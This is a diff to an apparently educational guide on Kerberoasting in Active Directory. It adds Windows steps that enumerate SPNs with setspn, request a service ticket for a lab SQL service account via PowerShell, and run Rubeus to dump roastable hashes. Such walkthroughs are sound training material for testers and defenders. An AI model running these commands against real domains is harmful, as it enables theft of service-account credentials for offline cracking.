@@ -3,6 +3,7 @@ This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/
 
 ![AD Herbros002](https://github.com/user-attachments/assets/f7ed51a4-9646-4ccc-a4e7-f302842ce711)
 
+---
 
 ## **Perform Kerberoasting using `Kali`:**
 
@@ -47,8 +48,23 @@ sudo timedatectl set-ntp off
 sudo rdate -n <Domain-IP>
 ```
 Then Run Command again and will work
+
+---
+
 ## **Perform Kerberoasting on `Windows` (joined domain):**
-By using use [Rubeus]([https://github.com/GhostPack/Rubeus](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/tree/main/Tools/GhostPack-Compiled%20Binaries)) 
+### Using built-in [setspn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary to Enumerating SPNs with setspn.exe
+```powershell
+setspn.exe -Q */*
+```
+![image](https://github.com/user-attachments/assets/f526d6e6-2615-4333-b64c-9e62656cf9bf)
+#### Targeting a Single User
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+![image](https://github.com/user-attachments/assets/8c61059a-b2e3-45fe-a1cc-c0dcbcef05dc)
+
+### Using use [Rubeus]([https://github.com/GhostPack/Rubeus](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/tree/main/Tools/GhostPack-Compiled%20Binaries)) 
 
 ``` powershell
 .\Rubeus.exe kerberoast /nowrap
